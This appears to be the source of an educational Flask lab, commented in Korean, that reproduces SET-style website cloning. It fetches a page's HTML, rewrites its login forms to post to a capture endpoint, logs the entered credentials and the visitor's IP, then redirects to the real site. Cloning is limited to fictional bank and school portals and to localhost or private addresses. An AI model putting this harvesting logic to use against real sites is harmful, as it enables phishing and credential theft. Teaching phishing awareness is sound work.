"""
사이트 복제 실습 - 자기완결형 교육용 Flask 앱.

이 앱은 칼리 리눅스의 SET(Social-Engineering Toolkit) '사이트 복제(Site Cloner)'와
같은 원리를 안전한 격리 환경에서 그대로 재현한다:

    1) 대상 페이지의 실제 HTML 소스를 내려받는다 (fetch)
    2) 똑같이 생긴 복제본을 공격자 서버에 다시 띄운다 (rehost)
    3) 복제본의 로그인 폼을 가로채 입력값을 수집한다 (harvest)
    4) 수집 후 진짜 사이트로 넘겨, 피해자가 눈치채지 못하게 한다 (forward)

가짜 텍스트를 바꿔치기하는 '시늉'이 아니라, 페이지 소스를 실제로 받아와
재호스팅하기 때문에 복제본은 원본과 픽셀 단위로 동일하다.

──────────────── 안전/윤리 설계 (반드시 유지) ────────────────
- 복제 대상은 (a) 이 앱에 내장된 가상 브랜드 포털, (b) 같은 격리망(localhost/사설 IP)
  안의 대상으로 제한한다. 공인 인터넷 사이트 복제는 차단한다.
- 학생은 가짜 자격증명만 입력하므로 수집값을 그대로 보여준다. 외부 전송·영구 저장 없음.
- 컨테이너 종료 시 모든 복제본·수집기록이 사라진다.
- 목적은 '복제가 얼마나 쉬운지'를 체감하고 '진짜를 가려내는 눈'을 기르는 것이다.
  배운 기법을 허락 없이 실제 사이트/사람에게 사용하는 것은 범죄다.
"""
from __future__ import annotations

import ipaddress
import re
import secrets
import urllib.request
from collections import deque
from datetime import datetime
from urllib.parse import urlparse

from flask import Flask, abort, redirect, render_template, request, url_for

app = Flask(__name__)

# ---- 메모리 상태 (영구 저장 없음) ----
CLONES: dict[str, dict] = {}          # cid -> {target_url, display_url, spoof, brand, time}
HARVEST: deque = deque(maxlen=50)     # 수집된 입력: {time, cid, spoof, items}

# 내장 가상 브랜드 포털 (오프라인에서도 복제가 동작하도록 번들)
TARGETS = {
    "hanbit": {
        "brand": "한빛은행 인터넷뱅킹",
        "template": "target_hanbit.html",
        "display_url": "https://www.hanbitbank.co.kr/ib/login",
        "spoof": "http://hanbitbank-event.com/login",
    },
    "duredu": {
        "brand": "두레에듀 학습포털",
        "template": "target_duredu.html",
        "display_url": "https://lms.duredu.kr/login",
        "spoof": "http://duredu-lms-verify.com/login",
    },
}

_FETCH_LIMIT = 2_000_000  # 2MB 상한


def _is_local_host(host: str) -> bool:
    """localhost / 사설 IP 대역만 허용 (공인 인터넷 대상 복제 차단)."""
    if not host:
        return False
    host = host.split(":")[0]
    if host in ("localhost",) or host.endswith(".local"):
        return True
    try:
        ip = ipaddress.ip_address(host)
        return ip.is_private or ip.is_loopback
    except ValueError:
        # 호스트명이 IP가 아니면(공인 도메인 가능성) 차단
        return False


def _fetch(url: str) -> tuple[str, str]:
    """대상 URL의 실제 HTML을 내려받아 (html, origin) 반환."""
    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0 (secu-lab cloner)"})
    with urllib.request.urlopen(req, timeout=8) as resp:  # noqa: S310 (로컬/사설 대상 한정)
        raw = resp.read(_FETCH_LIMIT)
    html = raw.decode("utf-8", errors="replace")
    p = urlparse(url)
    origin = f"{p.scheme}://{p.netloc}"
    return html, origin


def _transform(html: str, origin: str, cid: str) -> str:
    """내려받은 소스를 복제본으로 변형: <base> 주입 + 모든 폼을 수집기로 연결."""
    base_tag = f'<base href="{origin}/">'
    if re.search(r"<head[^>]*>", html, re.I):
        html = re.sub(r"(<head[^>]*>)", r"\1" + base_tag, html, count=1, flags=re.I)
    else:
        html = base_tag + html

    def fix_form(m: re.Match) -> str:
        tag = m.group(0)
        tag = re.sub(r'\saction\s*=\s*"[^"]*"', "", tag, flags=re.I)
        tag = re.sub(r"\saction\s*=\s*'[^']*'", "", tag, flags=re.I)
        tag = re.sub(r'\smethod\s*=\s*"[^"]*"', "", tag, flags=re.I)
        tag = re.sub(r"\smethod\s*=\s*'[^']*'", "", tag, flags=re.I)
        tag = tag[:-1] + f' action="/capture?cid={cid}" method="post">'
        return tag + f'<input type="hidden" name="_cid" value="{cid}" />'

    html = re.sub(r"<form[^>]*>", fix_form, html, flags=re.I)
    return html


# ----------------------------- 화면 -----------------------------
@app.route("/")
def console():
    """공격자 워크스테이션: 복제 실행 + 생성된 복제본 + 수집 현황."""
    base = request.host_url.rstrip("/")
    clones = []
    for cid, c in CLONES.items():
        clones.append({**c, "cid": cid, "link": f"{base}/clone/{cid}"})
    clones.reverse()
    return render_template(
        "index.html",
        targets=TARGETS,
        clones=clones,
        harvest=list(HARVEST),
        base=base,
    )


@app.route("/target/<name>")
def target(name: str):
    """내장 가상 브랜드의 '진짜' 로그인 포털 (복제 대상)."""
    meta = TARGETS.get(name)
    if not meta:
        abort(404)
    return render_template(meta["template"], brand=meta["brand"], display_url=meta["display_url"], real=True)


@app.route("/target-login", methods=["POST"])
def target_login():
    """진짜 포털의 로그인 처리 (실습에선 단순 안내)."""
    return render_template("target_done.html")


@app.route("/clone", methods=["POST"])
def clone():
    """대상 페이지 소스를 실제로 받아와 복제본으로 재호스팅한다."""
    name = request.form.get("target", "")
    custom = (request.form.get("url") or "").strip()
    base = request.host_url.rstrip("/")

    if name in TARGETS:
        meta = TARGETS[name]
        fetch_url = f"{base}/target/{name}"
        display_url = meta["display_url"]
        spoof = meta["spoof"]
        brand = meta["brand"]
    elif custom:
        parsed = urlparse(custom)
        if parsed.scheme not in ("http", "https") or not _is_local_host(parsed.netloc):
            return render_template(
                "index.html",
                targets=TARGETS,
                clones=[{**c, "cid": cid, "link": f"{base}/clone/{cid}"} for cid, c in reversed(CLONES.items())],
                harvest=list(HARVEST),
                base=base,
                error="이 실습 도구는 격리망(localhost·사설 IP) 안의 대상만 복제합니다. 공인 인터넷 사이트는 복제할 수 없습니다.",
            )
        fetch_url = custom
        display_url = custom
        spoof = f"http://{parsed.netloc.split(':')[0]}-login.example/login"
        brand = parsed.netloc
    else:
        return redirect(url_for("console"))

    try:
        html, origin = _fetch(fetch_url)
    except Exception as exc:  # noqa: BLE001
        return render_template(
            "index.html",
            targets=TARGETS,
            clones=[{**c, "cid": cid, "link": f"{base}/clone/{cid}"} for cid, c in reversed(CLONES.items())],
            harvest=list(HARVEST),
            base=base,
            error=f"대상 페이지를 가져오지 못했습니다: {exc}",
        )

    cid = secrets.token_hex(4)
    cloned_html = _transform(html, origin, cid)
    CLONES[cid] = {
        "html": cloned_html,
        "target_url": fetch_url,
        "display_url": display_url,
        "spoof": spoof,
        "brand": brand,
        "time": datetime.now().strftime("%H:%M:%S"),
    }
    return redirect(url_for("console") + f"#clone-{cid}")


@app.route("/clone/<cid>")
def serve_clone(cid: str):
    """재호스팅된 복제본(피싱 미러)을 제공한다."""
    c = CLONES.get(cid)
    if not c:
        abort(404)
    return c["html"]


@app.route("/capture", methods=["POST"])
def capture():
    """복제본 폼에 입력된 자격증명을 수집하고, 진짜 사이트로 넘긴다 (SET 방식)."""
    cid = request.args.get("cid") or request.form.get("_cid") or "?"
    fields = []
    for k, v in request.form.items():
        if k == "_cid":
            continue
        fields.append({"name": k, "value": v[:120], "len": len(v)})

    c = CLONES.get(cid)
    if fields:
        HARVEST.appendleft(
            {
                "time": datetime.now().strftime("%H:%M:%S"),
                "cid": cid,
                "spoof": c["spoof"] if c else "?",
                "ip": request.remote_addr or "?",
                "fields": fields,
            }
        )
    # 수집 후 진짜 사이트로 포워딩 (피해자가 눈치채지 못하게)
    return redirect(c["target_url"] if c else url_for("console"))


@app.route("/clear", methods=["POST"])
def clear():
    CLONES.clear()
    HARVEST.clear()
    return redirect(url_for("console"))


@app.route("/health")
def health():
    return {"status": "ok", "clones": len(CLONES), "harvested": len(HARVEST)}


if __name__ == "__main__":
    # threaded=True: 복제 시 자기 자신(내장 대상)에게 HTTP 요청을 보낼 수 있어야 함
    app.run(host="0.0.0.0", port=5003, threaded=True)
